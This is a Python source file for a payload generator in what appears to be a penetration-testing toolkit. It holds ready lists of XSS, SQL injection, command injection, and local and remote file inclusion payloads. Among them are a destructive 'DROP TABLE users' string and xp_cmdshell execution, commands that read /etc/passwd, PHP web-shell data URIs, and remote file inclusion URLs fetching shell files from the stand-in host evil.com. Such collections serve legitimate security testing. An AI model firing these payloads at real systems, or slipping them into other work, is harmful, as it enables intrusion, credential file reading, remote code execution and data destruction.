"""
BlackCell Security Toolkit - Payload Generator
"""

import random
import json
from pathlib import Path
from typing import List, Dict, Any
from blackcell.core.logger import setup_logger
from blackcell.core.config import get_config_value

class PayloadGenerator:
    """Generate various types of security testing payloads"""
    
    def __init__(self):
        self.logger = setup_logger("payload_generator")
        self.payloads = self.load_payloads()
    
    def load_payloads(self) -> Dict[str, List[str]]:
        """Load payloads from files or return defaults"""
        
        payloads = {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input type=image src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<video src=x onerror=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "</script><script>alert('XSS')</script>",
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
                "<IMG \"\"\"><SCRIPT>alert('XSS')</SCRIPT>\">",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script src=data:,alert('XSS')></script>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<form><button formaction=javascript:alert('XSS')>Click"
            ],
            "sqli": [
                "' OR 1=1--",
                "' OR '1'='1",
                "admin'--",
                "admin'/*",
                "' OR 1=1#",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' OR 'a'='a",
                "\" OR 1=1--",
                "' OR 1=1 LIMIT 1--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "' UNION ALL SELECT NULL--",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' UNION SELECT @@version--",
                "' WAITFOR DELAY '00:00:05'--",
                "'; EXEC xp_cmdshell('dir')--"
            ],
            "cmdi": [
                "; ls",
                "| whoami",
                "&& id",
                "|| cat /etc/passwd",
                "; cat /etc/passwd",
                "| cat /etc/passwd", 
                "&& cat /etc/passwd",
                "; id",
                "| id",
                "&& whoami",
                "`whoami`",
                "$(whoami)",
                "; uname -a",
                "| uname -a",
                "&& uname -a",
                "; ps aux",
                "| ps aux",
                "&& ps aux",
                "; netstat -an",
                "| netstat -an"
            ],
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "../../../../../etc/passwd%00",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....\\....\\....\\etc\\passwd",
                "/etc/passwd",
                "\\windows\\system32\\drivers\\etc\\hosts",
                "file:///etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain,<?php system($_GET['cmd']);?>",
                "expect://whoami",
                "zip://evil.zip#shell.php",
                "compress.zlib://evil.php",
                "/proc/self/environ",
                "/proc/version",
                "/proc/cmdline"
            ],
            "rfi": [
                "http://evil.com/shell.txt",
                "https://evil.com/shell.php",
                "ftp://evil.com/shell.php",
                "http://evil.com/shell.txt%00",
                "http://evil.com/shell.php?",
                "//evil.com/shell.php",
                "data:text/plain,<?php system($_GET['cmd']);?>",
                "php://input",
                "php://filter/resource=http://evil.com/shell.php"
            ]
        }
        
        # Try to load custom payloads from files
        try:
            payloads_dir = Path.home() / ".blackcell" / "data" / "payloads"
            
            for payload_type in payloads.keys():
                payload_file = payloads_dir / f"{payload_type}.txt"
                if payload_file.exists():
                    with open(payload_file, 'r') as f:
                        custom_payloads = [line.strip() for line in f if line.strip()]
                        if custom_payloads:
                            payloads[payload_type].extend(custom_payloads)
                            self.logger.info(f"Loaded {len(custom_payloads)} custom {payload_type} payloads")
        
        except Exception as e:
            self.logger.warning(f"Could not load custom payloads: {e}")
        
        return payloads
    
    def generate_payloads(self, payload_type: str, count: int = 1) -> List[str]:
        """Generate payloads of specified type"""
        
        if payload_type not in self.payloads:
            self.logger.error(f"Unknown payload type: {payload_type}")
            return []
        
        available_payloads = self.payloads[payload_type]
        
        if count == 1:
            return [random.choice(available_payloads)]
        elif count >= len(available_payloads):
            return available_payloads.copy()
        else:
            return random.sample(available_payloads, count)
    
    def list_payloads(self, payload_type: str) -> List[str]:
        """List all available payloads of specified type"""
        
        if payload_type not in self.payloads:
            self.logger.error(f"Unknown payload type: {payload_type}")
            return []
        
        return self.payloads[payload_type].copy()
    
    def get_payload_types(self) -> List[str]:
        """Get list of available payload types"""
        return list(self.payloads.keys())
    
    def add_custom_payload(self, payload_type: str, payload: str):
        """Add a custom payload"""
        
        if payload_type not in self.payloads:
            self.payloads[payload_type] = []
        
        if payload not in self.payloads[payload_type]:
            self.payloads[payload_type].append(payload)
            
            # Save to file
            self.save_custom_payload(payload_type, payload)
            self.logger.info(f"Added custom {payload_type} payload")
    
    def save_custom_payload(self, payload_type: str, payload: str):
        """Save custom payload to file"""
        try:
            payloads_dir = Path.home() / ".blackcell" / "data" / "payloads"
            payloads_dir.mkdir(parents=True, exist_ok=True)
            
            payload_file = payloads_dir / f"{payload_type}_custom.txt"
            
            with open(payload_file, 'a') as f:
                f.write(payload + '\n')
                
        except Exception as e:
            self.logger.error(f"Could not save custom payload: {e}")
    
    def generate_advanced_xss(self, context: str = "html") -> List[str]:
        """Generate advanced XSS payloads based on context"""
        
        contexts = {
            "html": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            "attribute": [
                "\" onmouseover=alert('XSS') \"",
                "' autofocus onfocus=alert('XSS') '",
                "javascript:alert('XSS')"
            ],
            "javascript": [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "alert('XSS')"
            ],
            "css": [
                "expression(alert('XSS'))",
                "javascript:alert('XSS')",
                "url(javascript:alert('XSS'))"
            ]
        }
        
        return contexts.get(context, contexts["html"])
    
    def generate_time_based_sqli(self, database: str = "mysql") -> List[str]:
        """Generate time-based SQL injection payloads"""
        
        databases = {
            "mysql": [
                "' AND (SELECT SLEEP(5))--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--",
                "'; WAITFOR DELAY '00:00:05'--"
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT COUNT(*) FROM generate_series(1,1000000))>1--"
            ],
            "oracle": [
                "' AND (SELECT COUNT(*) FROM ALL_USERS WHERE ROWNUM<=1000000)>1--",
                "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"
            ],
            "mssql": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2)>1--"
            ]
        }
        
        return databases.get(database, databases["mysql"])
    
    def generate_polyglot_payload(self) -> str:
        """Generate polyglot payload (works in multiple contexts)"""
        
        polyglots = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"><img/src=x onerror=alert(1)>"
        ]
        
        return random.choice(polyglots)